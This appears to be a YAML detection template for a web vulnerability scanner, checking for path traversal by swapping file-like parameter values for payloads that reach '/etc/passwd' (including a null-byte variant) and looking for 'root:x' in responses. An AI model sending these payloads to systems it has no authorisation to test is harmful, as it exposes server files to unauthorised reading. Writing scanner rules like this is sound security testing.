bug-name: "Path Traversal"
description: "Detect path traversal"
bug-type: "lfi"
target-arguments:
  - type: "regex"
    target: "value"
    part: "all"
    regexes: 
      - ^.*\.(js|json|html|htm|yaml|lock|yml|md|jpg|jsp|jsf|xhtml|xml|class|java|jar|seam|faces|shtml|ifaces|do|action|jspf|properties|bak|sql|zip|xml|old|inc|js|json|conf|cfg|log|yml|yaml|txt|sql|rar|bak|mp[34])$

number-of-flow: 2
flows:
  match-condition: "all"
  flow_1:
    endpoint: "{{base_url}}"
    payloads:
      - value: "../../../etc/passwd"
        position: "replace"
        tag: "linux"
      
      - value: "../../../../etc/passwd"
        position: "replace"
        tag: "linux"
      
      - value: "../../../../../etc/passwd"
        position: "replace"
        tag: "linux"

      - value: "../../../../../../etc/passwd"
        position: "replace"
        tag: "linux"

      - value: "/etc/passwd"
        position: "replace"
        tag: "linux"

      - value: "../../../etc/passwd\0.png"
        position: "replace"
        tag: "linux"
    verify:
      - function: "contain_any_patterns"
        args:
          patterns:
            - bin/bash
            - bin/sh
            - root:x
        expected-value: True